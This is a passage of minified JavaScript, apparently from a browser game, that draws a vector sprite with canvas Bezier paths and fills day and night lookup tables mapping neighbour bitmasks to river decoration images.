                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(59.000030517578125 * e, 121.85795593261719 * e),
                    r.bezierCurveTo(59.500030517578125 * e, 99.35795593261719 * e, 59.500030517578125 * e, 99.35795593261719 * e, 60.000030517578125 * e, 76.85795593261719 * e),
                    r.bezierCurveTo(84.00003051757812 * e, 92.35795593261719 * e, 84.00003051757812 * e, 92.35795593261719 * e, 108.00003051757812 * e, 107.85795593261719 * e),
                    r.bezierCurveTo(106.00003051757812 * e, 148.8579559326172 * e, 86.00003051757812 * e, 148.8579559326172 * e, 62.000030517578125 * e, 123.85795593261719 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105.00003051757812 * e, 132.8579559326172 * e),
                    r.bezierCurveTo(104.50003051757812 * e, 93.35795593261719 * e, 104.50003051757812 * e, 93.35795593261719 * e, 104.00003051757812 * e, 53.85795593261719 * e),
                    r.bezierCurveTo(126.50003051757812 * e, 75.85795593261719 * e, 126.50003051757812 * e, 75.85795593261719 * e, 149.00003051757812 * e, 97.85795593261719 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(311.0000305175781 * e, 126.85795593261719 * e),
                    r.bezierCurveTo(309.0000305175781 * e, 101.35795593261719 * e, 309.0000305175781 * e, 101.35795593261719 * e, 307.0000305175781 * e, 75.85795593261719 * e),
                    r.bezierCurveTo(271.0000305175781 * e, 96.85795593261719 * e, 271.0000305175781 * e, 96.85795593261719 * e, 235.00003051757812 * e, 117.85795593261719 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(228.00003051757812 * e, 96.85795593261719 * e),
                    r.bezierCurveTo(244.50003051757812 * e, 74.85795593261719 * e, 244.50003051757812 * e, 74.85795593261719 * e, 261.0000305175781 * e, 52.85795593261719 * e),
                    r.bezierCurveTo(265.5000305175781 * e, 89.85795593261719 * e, 265.5000305175781 * e, 89.85795593261719 * e, 270.0000305175781 * e, 126.85795593261719 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(12.000030517578125 * e, 86.13069152832031 * e),
                    r.bezierCurveTo(36.000030517578125 * e, 113.13069152832031 * e, 84.00003051757812 * e, 111.13069152832031 * e, 116.00003051757812 * e, 113.13069152832031 * e),
                    r.bezierCurveTo(164.00003051757812 * e, 23.130691528320312 * e, 172.00003051757812 * e, 18.130691528320312 * e, 181.00003051757812 * e, 9.130691528320312 * e),
                    r.bezierCurveTo(199.00003051757812 * e, 29.130691528320312 * e, 221.00003051757812 * e, 78.13069152832031 * e, 247.00003051757812 * e, 112.13069152832031 * e),
                    r.bezierCurveTo(301.0000305175781 * e, 122.13069152832031 * e, 338.0000305175781 * e, 111.13069152832031 * e, 359.0000305175781 * e, 94.13069152832031 * e),
                    r.bezierCurveTo(359.0000305175781 * e, 113.13069152832031 * e, 358.5000305175781 * e, 105.13069152832031 * e, 358.0000305175781 * e, 116.13069152832031 * e),
                    r.bezierCurveTo(270.5000305175781 * e, 130.1306915283203 * e, 270.5000305175781 * e, 130.1306915283203 * e, 183.00003051757812 * e, 144.1306915283203 * e),
                    r.bezierCurveTo(98.00003051757812 * e, 128.6306915283203 * e, 98.00003051757812 * e, 128.6306915283203 * e, 13.000030517578125 * e, 113.13069152832031 * e),
                    r.closePath(),
                    he(r, i[1], i[1], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(247.00003051757812 * e, 115.76704406738281 * e),
                    r.bezierCurveTo(305.0000305175781 * e, 124.76704406738281 * e, 335.0000305175781 * e, 112.76704406738281 * e, 359.0000305175781 * e, 93.76704406738281 * e),
                    r.bezierCurveTo(359.5000305175781 * e, 113.26704406738281 * e, 359.5000305175781 * e, 113.26704406738281 * e, 360.0000305175781 * e, 132.7670440673828 * e),
                    r.bezierCurveTo(339.0000305175781 * e, 177.7670440673828 * e, 281.0000305175781 * e, 178.7670440673828 * e, 243.00003051757812 * e, 183.7670440673828 * e),
                    r.bezierCurveTo(214.50003051757812 * e, 214.2670440673828 * e, 214.50003051757812 * e, 214.2670440673828 * e, 186.00003051757812 * e, 244.7670440673828 * e),
                    r.bezierCurveTo(155.00003051757812 * e, 214.2670440673828 * e, 155.00003051757812 * e, 214.2670440673828 * e, 124.00003051757812 * e, 183.7670440673828 * e),
                    r.bezierCurveTo(51.000030517578125 * e, 180.7670440673828 * e, 21.000030517578125 * e, 161.7670440673828 * e, 9.000030517578125 * e, 129.7670440673828 * e),
                    r.bezierCurveTo(8.500030517578125 * e, 110.76704406738281 * e, 8.500030517578125 * e, 110.76704406738281 * e, 8.000030517578125 * e, 91.76704406738281 * e),
                    r.bezierCurveTo(31.000030517578125 * e, 112.76704406738281 * e, 87.00003051757812 * e, 119.76704406738281 * e, 116.00003051757812 * e, 117.76704406738281 * e),
                    r.bezierCurveTo(175.00003051757812 * e, 18.767044067382812 * e, 170.00003051757812 * e, 23.767044067382812 * e, 181.00003051757812 * e, 14.767044067382812 * e),
                    r.bezierCurveTo(199.00003051757812 * e, 34.76704406738281 * e, 203.00003051757812 * e, 54.76704406738281 * e, 247.00003051757812 * e, 115.76704406738281 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(27.000030517578125 * e, 94.76704406738281 * e),
                    r.bezierCurveTo(11.000030517578125 * e, 81.76704406738281 * e, 31.000030517578125 * e, 72.76704406738281 * e, 44.000030517578125 * e, 59.76704406738281 * e),
                    r.bezierCurveTo(9.000030517578125 * e, 65.76704406738281 * e, 4.000030517578125 * e, 78.76704406738281 * e, 9.000030517578125 * e, 89.76704406738281 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(352.0000305175781 * e, 100.76705932617188 * e),
                    r.bezierCurveTo(362.0000305175781 * e, 92.76705932617188 * e, 352.0000305175781 * e, 84.76705932617188 * e, 340.0000305175781 * e, 68.76705932617188 * e),
                    r.bezierCurveTo(360.0000305175781 * e, 69.76705932617188 * e, 364.0000305175781 * e, 79.76705932617188 * e, 364.0000305175781 * e, 94.76705932617188 * e),
                    r.closePath(),
                    he(r, i[1], i[1], +e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(25.000030517578125 * e, 97.94886779785156 * e),
                    r.bezierCurveTo(2.000030517578125 * e, 76.94886779785156 * e, 29.000030517578125 * e, 62.94886779785156 * e, 44.000030517578125 * e, 59.94886779785156 * e),
                    r.bezierCurveTo(8.000030517578125 * e, 59.94886779785156 * e, -.999969482421875 * e, 81.94886779785156 * e, 4.000030517578125 * e, 92.94886779785156 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(349.0000305175781 * e, 100.94886779785156 * e),
                    r.bezierCurveTo(366.0000305175781 * e, 82.94886779785156 * e, 353.0000305175781 * e, 76.94886779785156 * e, 337.0000305175781 * e, 67.94886779785156 * e),
                    r.bezierCurveTo(366.0000305175781 * e, 69.94886779785156 * e, 366.0000305175781 * e, 83.94886779785156 * e, 363.0000305175781 * e, 101.94886779785156 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 10 * e),
                    ke(r, 46.000030517578125 * e, 137.5852279663086 * e, 9.219544457292887 * e),
                    he(r, i[4], i[5], +e),
                    ke(r, 308.0000305175781 * e, 141.5852279663086 * e, 8.54400374531753 * e),
                    he(r, i[4], i[5], +e),
                    ke(r, 92.00003051757812 * e, 149.58523559570312 * e, 14.866068747318506 * e),
                    he(r, i[4], i[5], +e),
                    ke(r, 262.0000305175781 * e, 148.8579559326172 * e, 15.620499351813308 * e),
                    he(r, i[4], i[5], +e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(184.00003051757812 * e, 68.85795593261719 * e),
                    r.bezierCurveTo(203.00003051757812 * e, 108.85795593261719 * e, 203.00003051757812 * e, 108.85795593261719 * e, 222.00003051757812 * e, 148.8579559326172 * e),
                    r.bezierCurveTo(202.50003051757812 * e, 177.8579559326172 * e, 202.50003051757812 * e, 177.8579559326172 * e, 183.00003051757812 * e, 206.8579559326172 * e),
                    r.bezierCurveTo(162.00003051757812 * e, 178.8579559326172 * e, 162.00003051757812 * e, 178.8579559326172 * e, 141.00003051757812 * e, 150.8579559326172 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(183.00003051757812 * e, 104.94886779785156 * e),
                    r.bezierCurveTo(192.50003051757812 * e, 125.44886779785156 * e, 192.50003051757812 * e, 125.44886779785156 * e, 202.00003051757812 * e, 145.94886779785156 * e),
                    r.bezierCurveTo(192.00003051757812 * e, 163.94886779785156 * e, 192.00003051757812 * e, 163.94886779785156 * e, 182.00003051757812 * e, 181.94886779785156 * e),
                    r.bezierCurveTo(172.50003051757812 * e, 164.44886779785156 * e, 172.50003051757812 * e, 164.44886779785156 * e, 163.00003051757812 * e, 146.94886779785156 * e),
                    r.closePath(),
                    he(r, i[6]),
                    n
            }
            function V0() {
                var e, t = (new Date).getTime();
                function i(e) {
                    for (var t = 0, i = 0, n = 0; i < e.length; i++) {
                        var r = e.charAt(i);
                        "_" !== r && 5 !== i && ("1" === r && (t += Math.pow(2, n)),
                            n++)
                    }
                    return t
                }
                for (e in render_cosmetics(),
                    sprite[ze.RIVER_WAVE] = [IMAGES.RIVER_WAVED, IMAGES.RIVER_WAVEN],
                    sprite[ze.RIVER_DECO] = [],
                    sprite[ze.RIVER_DECO][ze.DAY] = [],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_010_000")] = [IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO20],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_010_010")] = sprite[ze.RIVER_DECO][ze.DAY][i("000_010_000")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_011_000")] = sprite[ze.RIVER_DECO][ze.DAY][i("000_010_000")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_011_010")] = [IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_011_011")] = [IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_110_000")] = [IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO20],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_110_010")] = [IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO27],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_110_110")] = [IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO8, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO27],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_111_000")] = [IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_111_111")] = [IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO13],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_010_000")] = [IMAGES.DAY_RIVER_COMPO20],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_010_010")] = [IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_011_000")] = [IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO26],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_110_000")] = [IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")] = [IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_011_010")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_011_011")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_111_011")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_110_010")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_111_000")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_111_010")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_111_011")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_111_110")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("010_111_111")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_111_110")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("000_111_010")] = sprite[ze.RIVER_DECO][ze.DAY][i("010_110_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("011_011_000")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO26],
                    sprite[ze.RIVER_DECO][ze.DAY][i("011_011_010")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("011_011_011")] = [IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO15],
                    sprite[ze.RIVER_DECO][ze.DAY][i("011_111_000")] = sprite[ze.RIVER_DECO][ze.DAY][i("011_011_010")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("011_111_010")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("011_111_011")] = sprite[ze.RIVER_DECO][ze.DAY][i("011_111_010")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("011_111_110")] = sprite[ze.RIVER_DECO][ze.DAY][i("011_111_010")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("011_111_111")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("110_110_000")] = [IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO12, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("110_110_010")] = [IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("110_110_110")] = [IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("110_111_000")] = [IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO12, IMAGES.DAY_RIVER_COMPO14, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("110_111_110")] = [IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO14, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("110_111_111")] = sprite[ze.RIVER_DECO][ze.DAY][i("110_111_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("110_111_011")] = sprite[ze.RIVER_DECO][ze.DAY][i("110_111_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("110_111_010")] = sprite[ze.RIVER_DECO][ze.DAY][i("110_111_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("111_111_110")] = [IMAGES.DAY_RIVER_COMPO28, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO14, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO1],
                    sprite[ze.RIVER_DECO][ze.DAY][i("111_111_011")] = sprite[ze.RIVER_DECO][ze.DAY][i("111_111_110")],
                    sprite[ze.RIVER_DECO][ze.DAY][i("111_111_000")] = [IMAGES.DAY_RIVER_COMPO12, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO14],
                    sprite[ze.RIVER_DECO][ze.DAY][i("111_111_111")] = [IMAGES.DAY_RIVER_COMPO1, IMAGES.DAY_RIVER_COMPO2, IMAGES.DAY_RIVER_COMPO3, IMAGES.DAY_RIVER_COMPO4, IMAGES.DAY_RIVER_COMPO5, IMAGES.DAY_RIVER_COMPO6, IMAGES.DAY_RIVER_COMPO7, IMAGES.DAY_RIVER_COMPO9, IMAGES.DAY_RIVER_COMPO10, IMAGES.DAY_RIVER_COMPO11, IMAGES.DAY_RIVER_COMPO13, IMAGES.DAY_RIVER_COMPO15, IMAGES.DAY_RIVER_COMPO16, IMAGES.DAY_RIVER_COMPO17, IMAGES.DAY_RIVER_COMPO18, IMAGES.DAY_RIVER_COMPO19, IMAGES.DAY_RIVER_COMPO20, IMAGES.DAY_RIVER_COMPO21, IMAGES.DAY_RIVER_COMPO22, IMAGES.DAY_RIVER_COMPO23, IMAGES.DAY_RIVER_COMPO24, IMAGES.DAY_RIVER_COMPO25, IMAGES.DAY_RIVER_COMPO26, IMAGES.DAY_RIVER_COMPO28],
                    sprite[ze.RIVER_DECO][ze.DAY][i("111_111_010")] = sprite[ze.RIVER_DECO][ze.DAY][i("111_111_110")],
                    sprite[ze.RIVER_DECO][ze.NIGHT] = [],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_010_000")] = [IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO20],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_010_010")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("000_010_000")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_011_000")] = sprite[ze.RIVER_DECO][ze.NIGHT][i("000_010_000")],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_011_010")] = [IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_011_011")] = [IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO22, IMAGES.NIGHT_RIVER_COMPO23, IMAGES.NIGHT_RIVER_COMPO24, IMAGES.NIGHT_RIVER_COMPO25],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_110_000")] = [IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO20],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_110_010")] = [IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO27],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_110_110")] = [IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO8, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO25, IMAGES.NIGHT_RIVER_COMPO26, IMAGES.NIGHT_RIVER_COMPO27],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_111_000")] = [IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO17, IMAGES.NIGHT_RIVER_COMPO18, IMAGES.NIGHT_RIVER_COMPO19],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("000_111_111")] = [IMAGES.NIGHT_RIVER_COMPO11, IMAGES.NIGHT_RIVER_COMPO9, IMAGES.NIGHT_RIVER_COMPO7, IMAGES.NIGHT_RIVER_COMPO6, IMAGES.NIGHT_RIVER_COMPO5, IMAGES.NIGHT_RIVER_COMPO4, IMAGES.NIGHT_RIVER_COMPO13],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_010_000")] = [IMAGES.NIGHT_RIVER_COMPO20],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_010_010")] = [IMAGES.NIGHT_RIVER_COMPO16, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21],
                    sprite[ze.RIVER_DECO][ze.NIGHT][i("010_011_000")] = [IMAGES.NIGHT_RIVER_COMPO3, IMAGES.NIGHT_RIVER_COMPO20, IMAGES.NIGHT_RIVER_COMPO21, IMAGES.NIGHT_RIVER_COMPO26],
